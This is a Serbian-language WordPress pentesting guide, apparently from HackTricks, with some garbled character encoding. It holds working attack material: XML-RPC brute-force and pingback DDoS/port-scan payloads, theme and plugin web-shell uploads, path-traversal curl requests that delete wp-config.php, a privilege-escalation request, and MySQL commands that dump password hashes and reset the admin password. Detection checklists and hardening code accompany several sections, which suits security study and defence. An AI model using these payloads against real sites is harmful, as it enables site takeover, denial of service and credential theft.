# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

- **Uploaded** datoteke idu na: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Teme se mogu naÄ‡i u /wp-content/themes/,** tako da ako promenite neki php u temi da biste dobili RCE, verovatno Ä‡ete koristiti taj put. Na primer: KoristeÄ‡i **temu twentytwelve** moÅ¾ete **pristupiti** **404.php** datoteci u: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **JoÅ¡ jedan koristan URL moÅ¾e biti:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- U **wp-config.php** moÅ¾ete pronaÄ‡i root lozinku baze podataka.
- Podrazumevani putanje za prijavu koje treba proveriti: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Glavne WordPress datoteke**

- `index.php`
- `license.txt` sadrÅ¾i korisne informacije kao Å¡to je verzija WordPress-a koja je instalirana.
- `wp-activate.php` se koristi za proces aktivacije putem e-poÅ¡te prilikom postavljanja nove WordPress stranice.
- Folderi za prijavu (mogu biti preimenovani da bi se sakrili):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` je datoteka koja predstavlja funkciju WordPress-a koja omoguÄ‡ava prenos podataka putem HTTP-a kao transportnog mehanizma i XML-a kao mehanizma kodiranja. Ova vrsta komunikacije je zamenjena WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` je glavna direktorijum gde se Äuvaju dodaci i teme.
- `wp-content/uploads/` je direktorijum gde se Äuvaju sve datoteke koje su otpremljene na platformu.
- `wp-includes/` Ovo je direktorijum gde se Äuvaju osnovne datoteke, kao Å¡to su sertifikati, fontovi, JavaScript datoteke i dodaci.
- `wp-sitemap.xml` U WordPress verzijama 5.5 i veÄ‡im, WordPress generiÅ¡e XML datoteku mape sajta sa svim javnim postovima i javno upitnim tipovima postova i taksonomijama.

**Post exploitation**

- Datoteka `wp-config.php` sadrÅ¾i informacije potrebne WordPress-u za povezivanje sa bazom podataka, kao Å¡to su ime baze podataka, host baze podataka, korisniÄko ime i lozinka, kljuÄevi za autentifikaciju i soli, i prefiks tabela baze podataka. Ova konfiguraciona datoteka se takoÄ‘e moÅ¾e koristiti za aktiviranje DEBUG moda, Å¡to moÅ¾e biti korisno u reÅ¡avanju problema.

### Dozvole korisnika

- **Administrator**
- **Urednik**: Objavljuje i upravlja svojim i tuÄ‘im postovima
- **Autor**: Objavljuje i upravlja svojim postovima
- **Saradnik**: PiÅ¡e i upravlja svojim postovima, ali ih ne moÅ¾e objaviti
- **Pretplatnik**: Pregleda postove i ureÄ‘uje svoj profil

## **Pasivna enumeracija**

### **Dobijanje verzije WordPress-a**

Proverite da li moÅ¾ete pronaÄ‡i datoteke `/license.txt` ili `/readme.html`

Unutar **izvora koda** stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link datoteke

![](<../../images/image (533).png>)

- JavaScript datoteke

### Preuzmi dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzmi Teme
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ekstraktovanje verzija uopÅ¡te
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Plugin-i i Teme

Verovatno neÄ‡ete moÄ‡i da pronaÄ‘ete sve moguÄ‡e Plugin-e i Teme. Da biste ih otkrili, biÄ‡e potrebno da **aktivno Brute Force-ujete listu Plugin-a i Tema** (na sreÄ‡u, postoje automatski alati koji sadrÅ¾e ove liste).

### Korisnici

- **ID Brute:** Dobijate validne korisnike sa WordPress sajta Brute Forcing-om ID-eva korisnika:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaÄi da je id **validan**. Ako je odgovor **400**, onda je id **nevalidan**.

- **wp-json:** TakoÄ‘e moÅ¾ete pokuÅ¡ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
JoÅ¡ jedan `/wp-json/` krajnji taÄka koja moÅ¾e otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Napomena da ovaj krajnji taÄka izlaÅ¾e samo korisnike koji su napravili post. **Samo informacije o korisnicima koji imaju ovu funkciju omoguÄ‡enu Ä‡e biti pruÅ¾ene**.

TakoÄ‘e, napomena da **/wp-json/wp/v2/pages** moÅ¾e da otkrije IP adrese.

- **Enumeracija korisniÄkih imena za prijavu**: Kada se prijavljujete na **`/wp-login.php`**, **poruka** je **drugaÄija** u zavisnosti od toga da li je **korisniÄko ime prisutno ili ne**.

### XML-RPC

Ako je `xml-rpc.php` aktivan, moÅ¾ete izvrÅ¡iti brute-force napad na kredencijale ili ga koristiti za pokretanje DoS napada na druge resurse. (MoÅ¾ete automatizovati ovaj proces[ koristeÄ‡i ovo](https://github.com/relarizky/wpxploit) na primer).

Da biste proverili da li je aktivan, pokuÅ¡ajte da pristupite _**/xmlrpc.php**_ i poÅ¡aljite ovaj zahtev:

**Proveri**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce kredencijali**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za bruteforce kredencijale. Ako moÅ¾ete pronaÄ‡i neku od njih, moÅ¾ete poslati neÅ¡to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"PogreÅ¡no korisniÄko ime ili lozinka"_ unutar odgovora sa kodom 200 treba da se pojavi ako akreditivi nisu validni.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

KoriÅ¡Ä‡enjem ispravnih akreditiva moÅ¾ete otpremiti datoteku. U odgovoru Ä‡e se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
TakoÄ‘e postoji **brÅ¾i naÄin** za brute-force kredencijale koristeÄ‡i **`system.multicall`** jer moÅ¾ete isprobati nekoliko kredencijala u istom zahtevu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ObilaÅ¾enje 2FA**

Ova metoda je namenjena programima, a ne ljudima, i stara je, stoga ne podrÅ¾ava 2FA. Dakle, ako imate vaÅ¾eÄ‡e kredencijale, ali je glavni ulaz zaÅ¡tiÄ‡en 2FA, **moÅ¾da Ä‡ete moÄ‡i da zloupotrebite xmlrpc.php da se prijavite sa tim kredencijalima obilaÅ¾eÄ‡i 2FA**. Imajte na umu da neÄ‡ete moÄ‡i da izvrÅ¡ite sve radnje koje moÅ¾ete da uradite putem konzole, ali moÅ¾da Ä‡ete i dalje moÄ‡i da doÄ‘ete do RCE-a kao Å¡to Ippsec objaÅ¡njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ili skeniranje portova**

Ako moÅ¾ete pronaÄ‡i metodu _**pingback.ping**_ unutar liste, moÅ¾ete naterati Wordpress da poÅ¡alje proizvoljan zahtev bilo kom hostu/portu.\
Ovo se moÅ¾e koristiti da se zatraÅ¾i **hiljade** Wordpress **sajtova** da **pristupe** jednoj **lokaciji** (tako da se izazove **DDoS** na toj lokaciji) ili moÅ¾ete to koristiti da naterate **Wordpress** da **skanira** neku internu **mreÅ¾u** (moÅ¾ete naznaÄiti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vrednoÅ¡Ä‡u **veÄ‡om** od **0** (17), to znaÄi da je port otvoren.

Pogledajte koriÅ¡Ä‡enje **`system.multicall`** u prethodnom odeljku da biste nauÄili kako da zloupotrebite ovu metodu za izazivanje DDoS-a.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ova datoteka obiÄno postoji u korenu Wordpress sajta: **`/wp-cron.php`**\
Kada se ova datoteka **pristupi**, izvrÅ¡ava se "**teÅ¡ka**" MySQL **upit**, tako da bi mogla biti koriÅ¡Ä‡ena od strane **napadaÄa** da **uzrokuje** **DoS**.\
TakoÄ‘e, po defaultu, `wp-cron.php` se poziva pri svakom uÄitavanju stranice (svaki put kada klijent zatraÅ¾i neku Wordpress stranicu), Å¡to na sajtovima sa velikim prometom moÅ¾e izazvati probleme (DoS).

PreporuÄuje se da se onemoguÄ‡i Wp-Cron i da se kreira pravi cronjob unutar hosta koji izvrÅ¡ava potrebne radnje u redovnim intervalima (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

PokuÅ¡ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Wordpress sajt moÅ¾e da poÅ¡alje zahtev ka vama.

Ovo je odgovor kada ne funkcioniÅ¡e:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li **methodName: pingback.ping** postoji za putanju **/wp-json/oembed/1.0/proxy** i ako postoji, pokuÅ¡ava da ih iskoristi.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijanje pristupa prepisivanjem bita

ViÅ¡e od pravog napada, ovo je radoznalost. U CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogli ste da preokrenete 1 bit iz bilo kog wordpress fajla. Tako ste mogli da preokrenete poziciju `5389` fajla `/var/www/html/wp-includes/user.php` da NOP-ujete NOT (`!`) operaciju.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifikovanje php iz teme koja se koristi (potrebne admin kredencijale)**

Izgled â†’ Urednik teme â†’ 404 Å ablon (s desne strane)

Promenite sadrÅ¾aj za php shell:

![](<../../images/image (384).png>)

PretraÅ¾ite internet kako moÅ¾ete pristupiti toj aÅ¾uriranoj stranici. U ovom sluÄaju morate pristupiti ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¾ete koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¾da Ä‡e biti moguÄ‡e uploadovati .php fajlove kao plugin.\
Kreirajte svoj php backdoor koristeÄ‡i, na primer:

![](<../../images/image (183).png>)

Zatim dodajte novi plugin:

![](<../../images/image (722).png>)

Uploadujte plugin i pritisnite Install Now:

![](<../../images/image (249).png>)

Kliknite na Procced:

![](<../../images/image (70).png>)

Verovatno ovo neÄ‡e uÄiniti niÅ¡ta oÄigledno, ali ako odete na Media, videÄ‡ete vaÅ¡ shell uploadovan:

![](<../../images/image (462).png>)

Pristupite mu i videÄ‡ete URL za izvrÅ¡avanje reverse shell-a:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda ukljuÄuje instalaciju malicioznog plugina za koji se zna da je ranjiv i moÅ¾e se iskoristiti za dobijanje web shell-a. Ovaj proces se sprovodi kroz WordPress kontrolnu tablu na sledeÄ‡i naÄin:

1. **Plugin Acquisition**: Plugin se dobija iz izvora kao Å¡to je Exploit DB kao [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Idite na WordPress kontrolnu tablu, zatim idite na `Dashboard > Plugins > Upload Plugin`.
- Uploadujte zip fajl preuzetog plugina.
3. **Plugin Activation**: Kada je plugin uspeÅ¡no instaliran, mora se aktivirati kroz kontrolnu tablu.
4. **Exploitation**:
- Sa instaliranim i aktiviranim pluginom "reflex-gallery", moÅ¾e se iskoristiti jer je poznato da je ranjiv.
- Metasploit framework pruÅ¾a exploit za ovu ranjivost. UÄitajte odgovarajuÄ‡i modul i izvrÅ¡ite specifiÄne komande da biste uspostavili meterpreter sesiju, Å¡to omoguÄ‡ava neovlaÅ¡Ä‡en pristup sajtu.
- Napominje se da je ovo samo jedna od mnogih metoda za iskoriÅ¡Ä‡avanje WordPress sajta.

SadrÅ¾aj ukljuÄuje vizuelne prikaze koji prikazuju korake u WordPress kontrolnoj tabli za instalaciju i aktivaciju plugina. MeÄ‘utim, vaÅ¾no je napomenuti da je iskoriÅ¡Ä‡avanje ranjivosti na ovaj naÄin ilegalno i neetiÄno bez odgovarajuÄ‡e dozvole. Ove informacije treba koristiti odgovorno i samo u legalnom kontekstu, kao Å¡to je pentesting sa eksplicitnom dozvolom.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost na **Remote Code Execution (RCE)** ili druge kritiÄne ranjivosti u WordPress-u. Za viÅ¡e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). PruÅ¾a **podrÅ¡ku za Wordpress verzije 6.X.X, 5.X.X i 4.X.X i omoguÄ‡ava:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Uploadujte svoj prilagoÄ‘eni plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Uredite ugraÄ‘ene plugine u WordPress-u.
- _**(RCE) Built-In Theme Edit:**_ Uredite ugraÄ‘ene teme u WordPress-u.
- _**(Custom) Custom Exploits:**_ PrilagoÄ‘eni exploits za treÄ‡e strane WordPress plugine/teme.

## Post Exploitation

Izvucite korisniÄka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promenite administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Znanje o tome kako Wordpress dodatak moÅ¾e izloÅ¾iti funkcionalnost je kljuÄno za pronalaÅ¾enje ranjivosti u njegovoj funkcionalnosti. MoÅ¾ete pronaÄ‡i kako dodatak moÅ¾e izloÅ¾iti funkcionalnost u sledeÄ‡im taÄkama i neke primere ranjivih dodataka u [**ovom blog postu**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naÄina na koji dodatak moÅ¾e izloÅ¾iti funkcije korisnicima je putem AJAX handler-a. Ovi handler-i mogu sadrÅ¾ati logiku, greÅ¡ke u autorizaciji ili autentifikaciji. Å taviÅ¡e, priliÄno je Äesto da Ä‡e ove funkcije zasnivati i autentifikaciju i autorizaciju na postojanju Wordpress nonce-a koji **bilo koji korisnik autentifikovan u Wordpress instanci moÅ¾e imati** (nezavisno od njegove uloge).

Ovo su funkcije koje se mogu koristiti za izlaganje funkcije u dodatku:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**KoriÅ¡Ä‡enje `nopriv` Äini krajnju taÄku dostupnom svim korisnicima (Äak i neautentifikovanim).**

> [!CAUTION]
> Pored toga, ako funkcija samo proverava autorizaciju korisnika pomoÄ‡u funkcije `wp_verify_nonce`, ova funkcija samo proverava da li je korisnik prijavljen, obiÄno ne proverava ulogu korisnika. Tako da korisnici sa niskim privilegijama mogu imati pristup akcijama sa visokim privilegijama.

- **REST API**

TakoÄ‘e je moguÄ‡e izloÅ¾iti funkcije iz WordPress-a registrujuÄ‡i REST AP koristeÄ‡i funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` je povratna funkcija koja proverava da li je dati korisnik ovlaÅ¡Ä‡en da pozove API metodu.

**Ako se koristi ugraÄ‘ena funkcija `__return_true`, jednostavno Ä‡e preskoÄiti proveru korisniÄkih dozvola.**

- **Direktan pristup php datoteci**

Naravno, Wordpress koristi PHP i datoteke unutar dodataka su direktno dostupne sa veba. Dakle, u sluÄaju da dodatak izlaÅ¾e bilo koju ranjivu funkcionalnost koja se aktivira jednostavnim pristupom datoteci, biÄ‡e eksploatabilna od strane bilo kog korisnika.

### Neautentifikovano proizvoljno brisanje datoteka putem wp_ajax_nopriv (Litho Tema <= 3.0)

WordPress teme i dodaci Äesto izlaÅ¾u AJAX rukovaoce putem `wp_ajax_` i `wp_ajax_nopriv_` hook-ova. Kada se koristi varijanta **_nopriv_**, **povratna funkcija postaje dostupna neautentifikovanim posetiocima**, tako da svaka osetljiva akcija mora dodatno implementirati:

1. Proveru **kapaciteta** (npr. `current_user_can()` ili barem `is_user_logged_in()`), i
2. **CSRF nonce** validiran sa `check_ajax_referer()` / `wp_verify_nonce()`, i
3. **Strogu sanitizaciju / validaciju unosa**.

Litho multipurpose tema (< 3.1) je zaboravila ta 3 kontrola u funkciji *Remove Font Family* i zavrÅ¡ila je sa slanjem sledeÄ‡eg koda ( pojednostavljeno):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi koje uvodi ovaj deo koda:

* **Neautentifikovani pristup** â€“ `wp_ajax_nopriv_` hook je registrovan.
* **Nema nonce / provere sposobnosti** â€“ bilo koji posetilac moÅ¾e da pristupi kraju.
* **Nema sanitizacije putanje** â€“ string `fontfamily` koji kontroliÅ¡e korisnik se konkatenira sa putanjom do datoteÄnog sistema bez filtriranja, Å¡to omoguÄ‡ava klasiÄnu `../../` traversalu.

#### Eksploatacija

NapadaÄ moÅ¾e obrisati bilo koju datoteku ili direktorijum **ispod osnovnog direktorijuma za upload** (obiÄno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Zato Å¡to `wp-config.php` Å¾ivi van *uploads*, Äetiri `../` sekvence su dovoljne na podrazumevanoj instalaciji. Brisanje `wp-config.php` prisiljava WordPress da uÄ‘e u *Äarobnjaka za instalaciju* pri sledeÄ‡em posetu, omoguÄ‡avajuÄ‡i potpunu preuzimanje sajta (napadaÄ samo unosi novu DB konfiguraciju i kreira admin korisnika).

Ostali znaÄajni ciljevi ukljuÄuju `.php` datoteke dodataka/tema (da bi se prekinuli sigurnosni dodaci) ili pravila `.htaccess`.

#### Lista za detekciju

* Bilo koji `add_action( 'wp_ajax_nopriv_...')` povratni poziv koji poziva pomoÄ‡ne funkcije za datoteÄni sistem (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacija neproÄiÅ¡Ä‡enog korisniÄkog unosa u putanje (traÅ¾ite `$_POST`, `$_GET`, `$_REQUEST`).
* Odsustvo `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

#### OjaÄavanje
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Uvek** tretirajte svaku operaciju pisanja/brisanja na disku kao privilegovanu i dvostruko proverite:
> â€¢ Autentifikacija  â€¢ Autorizacija  â€¢ Nonce  â€¢ Sanitizacija unosa  â€¢ OgraniÄenje putanje (npr. putem `realpath()` plus `str_starts_with()`).

---

### Eskalacija privilegija putem obnavljanja zastarelih uloga i nedostatka autorizacije (ASE "Pogledaj Admin kao Ulogu")

Mnogi dodaci implementiraju funkciju "pogledaj kao uloga" ili privremeno prebacivanje uloga tako Å¡to Äuvaju originalne uloge u korisniÄkim metapodacima kako bi ih kasnije mogli obnoviti. Ako putanja obnove zavisi samo od parametara zahteva (npr. `$_REQUEST['reset-for']`) i liste koju odrÅ¾ava dodatak bez provere sposobnosti i vaÅ¾eÄ‡eg nonce-a, to postaje vertikalna eskalacija privilegija.

Primer iz stvarnog sveta pronaÄ‘en je u dodatku Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). Grana resetovanja obnavlja uloge na osnovu `reset-for=<username>` ako se korisniÄko ime pojavljuje u internom nizu `$options['viewing_admin_as_role_are']`, ali nije izvrÅ¡ila ni `current_user_can()` proveru ni verifikaciju nonce-a pre nego Å¡to je uklonila trenutne uloge i ponovo dodala saÄuvane uloge iz korisniÄkih metapodataka `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ZaÅ¡to je podloÅ¾an eksploataciji

- Veruje `$_REQUEST['reset-for']` i opciji dodatka bez autorizacije na serverskoj strani.
- Ako je korisnik prethodno imao viÅ¡e privilegije saÄuvane u `_asenha_view_admin_as_original_roles` i bio je sniÅ¾en, moÅ¾e ih obnoviti tako Å¡to Ä‡e pritisnuti putanju za resetovanje.
- U nekim implementacijama, bilo koji autentifikovani korisnik mogao bi pokrenuti resetovanje za drugo korisniÄko ime koje je joÅ¡ uvek prisutno u `viewing_admin_as_role_are` (pokidana autorizacija).

Preduslovi za napad

- Ranjiva verzija dodatka sa omoguÄ‡enom funkcijom.
- Ciljani nalog ima zastarelu ulogu sa visokim privilegijama saÄuvanu u korisniÄkoj meti iz ranijeg koriÅ¡Ä‡enja.
- Bilo koja autentifikovana sesija; nedostajuÄ‡i nonce/kapacitet u toku resetovanja.

Eksploatacija (primer)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na ranjivim verzijama ovo uklanja trenutne uloge i ponovo dodaje saÄuvane originalne uloge (npr., `administrator`), efikasno poveÄ‡avajuÄ‡i privilegije.

Lista za detekciju

- PotraÅ¾ite funkcije za prebacivanje uloga koje Äuvaju â€œoriginalne ulogeâ€ u korisniÄkoj meti (npr., `_asenha_view_admin_as_original_roles`).
- Identifikujte putanje za resetovanje/obnavljanje koje:
- ÄŒitaju korisniÄka imena iz `$_REQUEST` / `$_GET` / `$_POST`.
- Modifikuju uloge putem `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizuju na osnovu niza opcija dodatka (npr., `viewing_admin_as_role_are`) umesto na osnovu sposobnosti aktera.

OjaÄavanje

- Sprovodite provere sposobnosti na svakoj grani koja menja stanje (npr., `current_user_can('manage_options')` ili stroÅ¾ije).
- Zahtevajte nonce za sve mutacije uloga/dozvola i verifikujte ih: `check_admin_referer()` / `wp_verify_nonce()`.
- Nikada ne verujte korisniÄkim imenima koja su dostavljena putem zahteva; reÅ¡avajte ciljnog korisnika na serverskoj strani na osnovu autentifikovanog aktera i eksplicitne politike.
- NevaÅ¾eÄ‡e stanje â€œoriginalnih ulogaâ€ prilikom aÅ¾uriranja profila/uloga kako biste izbegli zastarelo vraÄ‡anje visokih privilegija:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Razmotrite Äuvanje minimalnog stanja i koriÅ¡Ä‡enje vremenski ograniÄenih, sposobnostima zaÅ¡tiÄ‡enih tokena za privremene promene uloga.

---

## WordPress zaÅ¡tita

### Redovne aÅ¾uriranja

Uverite se da su WordPress, dodaci i teme aÅ¾urirani. TakoÄ‘e potvrdite da je automatsko aÅ¾uriranje omoguÄ‡eno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
TakoÄ‘e, **instalirajte samo pouzdane WordPress dodatke i teme**.

### Bezbednosni dodaci

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

- Uklonite podrazumevanog **admin** korisnika
- Koristite **jake lozinke** i **2FA**
- PeriodiÄno **proveravajte** dozvole korisnika
- **OgraniÄite pokuÅ¡aje prijavljivanja** kako biste spreÄili Brute Force napade
- Preimenujte **`wp-admin.php`** datoteku i dozvolite pristup samo interno ili sa odreÄ‘enih IP adresa.

### Neautentifikovana SQL injekcija putem nedovoljne validacije (WP Job Portal <= 2.3.2)

WP Job Portal dodatak za zapoÅ¡ljavanje izloÅ¾io je **savecategory** zadatak koji na kraju izvrÅ¡ava sledeÄ‡i ranjivi kod unutar `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **NeproÄiÅ¡Ä‡eni korisniÄki unos** â€“ `parentid` dolazi direktno iz HTTP zahteva.
2. **Konkatenacija stringova unutar WHERE klauzule** â€“ nema `is_numeric()` / `esc_sql()` / pripremljene izjave.
